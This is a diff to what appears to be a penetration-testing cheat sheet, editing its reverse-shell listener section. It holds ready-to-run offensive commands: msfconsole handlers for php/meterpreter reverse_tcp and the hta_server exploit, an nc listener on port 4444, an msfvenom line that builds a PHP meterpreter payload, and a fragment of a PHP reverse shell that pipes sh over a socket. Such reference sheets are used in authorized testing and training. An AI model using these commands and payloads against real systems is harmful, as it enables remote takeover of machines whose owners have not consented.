@@ -112,9 +112,10 @@ setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR
 
 # Exploitation
 ## Reverse Shell Listeners
-msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set SRVHOST $MYIP; run"
+rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set SRVHOST $MYIP; run"
 nc -lvnp 4444
-msfconsole -q -x "use multi/handler; set LHOST $MYIP; set LPORT 4444; run"
+rlwrap msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 4444; run"
+rlwrap msfconsole -q -x "use multi/handler; set LHOST $MYIP; set LPORT 4444; run"
 
 ## Web
 [*] Reverse Shell
@@ -128,7 +129,6 @@ msfconsole -q -x "use multi/handler; set LHOST $MYIP; set LPORT 4444; run"
         exec("sh <&3 >&3 2>&3");
         }
 ?>
-msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 4444; run"
 msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=4444 -f raw > msfshell.php
 
 [*] Web Shell
